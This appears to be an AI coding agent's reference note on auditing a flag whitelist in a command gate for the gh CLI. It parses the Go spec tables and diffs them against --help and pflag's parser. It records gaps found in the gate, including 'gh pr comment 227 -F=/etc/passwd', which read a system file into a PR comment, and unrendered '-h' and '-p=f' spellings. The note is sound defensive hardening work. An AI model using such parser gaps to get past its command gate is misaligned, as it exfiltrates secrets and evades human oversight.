---
name: audit-a-help-derived-flag-whitelist
description: When a gate PR claims a per-verb flag table is "the verb's COMPLETE grammar from --help", machine-diff every verb's spec against its own --help on two axes (presence AND value/bool arity) by parsing the Go table with python — and remember that --help is not the accepted grammar, so pflag's unrendered `-h` and its `-F=path` spelling escape the transcription.
metadata:
  type: reference
---

A whitelist-of-flags fail-safe (`ghFileSpecs` on #232, `ghAuthStatusEscalates`
before it) rests on one checkable claim: *this spec is the verb's complete flag
grammar*. Spot-checking three verbs does not test it, and the table is too big
to eyeball — on #232 it was 26 noun/verb pairs. Count them out of the table
itself, and diff your pair list against it: #232's round-2 audit said 25 and had
silently dropped `cache delete`, so the "every pair matches" verdict covered one
pair fewer than it claimed.

**Machine-diff it.** Parse the Go table out of the source with python (locate
`var <table> =`, strip `//` comments so prose flags are not counted, split on
the `^\t"noun": {` / `^\t\t"verb":` indent levels, then regex
`"(--?[A-Za-z][-A-Za-z0-9]*)"` inside each verb's span; expand shared vars like
`ghBodyFileFlags` by name). Then for each pair run `<tool> <noun> <verb> --help`
and diff. Both directions are informative: gh-documented-but-unmodelled is a
false ask, modelled-but-undocumented is usually a harmless uniform merge (#232
folded `-R`/`--repo` into the `gist` specs, which gh rejects — no consequence).

**The axis that actually matters is ARITY, not presence.** A bool mismodelled
as value-taking consumes the next token, and on a verb with file positionals
that is the one way such a walk can swallow a path OUT of containment. Split
the `ghSpec(valueFlags, boolFlags, …)` call by tracking brace depth and compare
each set against whether the help line carries a value-type word
(`-F, --body-file file` then the description). Expect false positives from
description text that begins with a flag-shaped word — gh renders
`--succeed-on-no-caches --all   Return exit code 0…`, which parses as a type;
read the raw line (`cat -A`) before filing.

**`--help` output is not the accepted grammar.** gh's help block prints only
`--help`, so a table transcribed faithfully from help still escalated
`gh pr comment -h` — verified accepted (`gh pr comment -h` and
`gh gist create -h` both print help, exit 0) while the PR's binary asked. #232's
fix round modelled it. The mechanism is **pflag, not cobra**: gh's root
registers a persistent `--help` with no shorthand
(`cmd.PersistentFlags().Bool("help", …)`), which `mergePersistentFlags` makes
visible to cobra's `InitDefaultHelpFlag`, so cobra never adds `-h`; pflag's
`parseSingleShortArg` answers an *unregistered* `h` with `f.usage()` + `ErrHelp`
instead of an error. So read the flag LIBRARY's parser, not just the framework.

**The rest of that class is where the teeth are.** pflag also strips an `=`
immediately after a shorthand (`if len(shorthands) > 2 && shorthands[1] == '='`),
which getopt does not, so `gh pr comment 227 -F=/etc/passwd` opens `/etc/passwd`
while a getopt-shaped extractor reads the value as the relative, in-repo
`=/etc/passwd` — an outright ALLOW on the exfil #229 exists to stop, found while
fixing the `-h` Low and fixed with it. The sibling reading, `-p=f` =
`--public=false`, ends the token, so a walk that keeps screening past the `=`
reads the trailing `f` as `--filename` and swallows the next operand. When a
finding names ONE unrendered spelling, the parser's whole grammar is the class:
diff the spec against the LIBRARY's parse, and probe `-x=value` on both a
value-taking and a bool shorthand. Hidden flags are worth one search
(`gh api -X GET search/code -f q='MarkHidden repo:cli/cli path:pkg/cmd'` — none
of the 26 modelled pairs has one) and abbreviations are not a pflag feature
(`gh pr comment --bod x` → `unknown flag`).

**How to apply:** on any gate PR that adds or extends a per-verb/per-program
flag whitelist. Keep the audit scripts in `<repo>/.claude/tmp/<slug>/` and run
them with `python3 <script>` — they need no gate-awkward shell. Related:
[[new-allow-track-entries-need-flag-value-audit]] (the same table seen from the
value-is-a-path side), [[guardrails-binary-verification]].
